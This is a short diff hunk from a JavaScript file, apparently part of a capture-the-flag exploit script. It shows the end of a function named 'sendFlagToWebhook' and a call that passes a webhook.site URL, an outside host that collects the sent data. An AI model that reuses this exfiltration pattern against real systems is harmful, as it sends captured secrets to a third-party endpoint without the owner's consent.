@@ -12,5 +12,4 @@ async function sendFlagToWebhook(webhookUrl) {
     console.error('Error:', error);
   }
 }
-
 sendFlagToWebhook('https://webhook.site/371f727f-1132-432d-b19d-079d450dee55');
